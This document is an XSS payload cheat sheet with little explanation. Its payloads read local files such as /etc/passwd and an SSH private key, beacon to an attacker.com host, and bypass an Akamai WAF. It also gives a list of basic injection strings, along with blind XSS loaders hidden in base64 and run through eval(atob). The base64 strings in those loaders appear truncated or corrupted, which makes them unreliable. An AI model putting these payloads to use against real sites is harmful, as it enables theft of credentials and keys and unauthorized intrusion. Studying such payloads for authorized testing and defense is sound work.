
### XSS to LFI Payloads

1. **Read `/etc/hosts` file:**
   ```html
   <script>
   x = new XMLHttpRequest();
   x.onload = function() {
       document.write(this.responseText);
   };
   x.open('GET', 'file:///etc/hosts');
   x.send();
   </script>
   ```

2. **Read `/etc/passwd` file:**
   ```html
   <script>
   x = new XMLHttpRequest();
   x.onload = function() {
       document.write(this.responseText);
   };
   x.open('GET', 'file:///etc/passwd');
   x.send();
   </script>
   ```

3. **Get SSH private key (`id_rsa`):**
   ```html
   <script>
   x = new XMLHttpRequest();
   x.onload = function() {
       document.write(this.responseText);
   };
   x.open('GET', 'file:///home/reader/.ssh/id_rsa');
   x.send();
   </script>
   ```

### XSS Payload for Server Pinging

**Ping the server continuously every 500ms:**
```html
<script>
let time = 500;
setInterval(() => {
    let img = document.createElement("img");
    img.src = `https://attacker.com/ping?time=${time}ms`;
    time += 500;
}, 500);
</script>
<img src="https://attacker.com/delay">
```

### Directory Bruteforcing Wordlist

For directory bruteforcing, use the following wordlist:

- [OneListForAll](https://github.com/six2dez/OneListForAll)

### Small XSS Payload List for Manual Testing

1. Basic XSS injection:
   ```html
   "><img src onerror=alert(1)>
   ```
2. Using `autofocus` and `onfocus` attributes:
   ```html
   "autofocus onfocus=alert(1)//
   ```
3. Injecting a `<script>` tag:
   ```html
   </script><script>alert(1)</script>
   ```
4. Simple alert injection:
   ```html
   '-alert(1)-'
   ```
5. JavaScript injection:
   ```html
   \'-alert(1)//
   javascript:alert(1)
   ```

### Store Payload in URL Fragment

**Payload that utilizes URL fragment for XSS:**
```html
"><script>eval(new URL(document.location.href+"#javascript:confirm(69)").hash.slice(1))</script>
```

### Akamai WAF Bypass XSS Payload

**Bypassing Akamai WAF:**
```html
<A href="javascrip%09t&colon;eval.apply${[jj.className+(23)]}" id=jj class=alert>Click Here</A>
```

### SVG-Based XSS Payload

**Using `data:` URL and `<svg>`:**
```html
"><img/src/style=html:url("data:,"><svg/onload=confirm(69)>")>
```

### Blind XSS Payloads

1. **Max Payload for Blind XSS (5-7 characters):**
   ```html
   '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3Jgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vamVycnkuYnhzm9keS5hcHBlbmRDaGlsZChhKTs=&#61 onerror=eval(atob(this.id))>
   ```

2. **Another version of Blind XSS Payload:**
   ```html
   "'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS57ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&#61 onerror=eval(atob(this.id))>
   ```

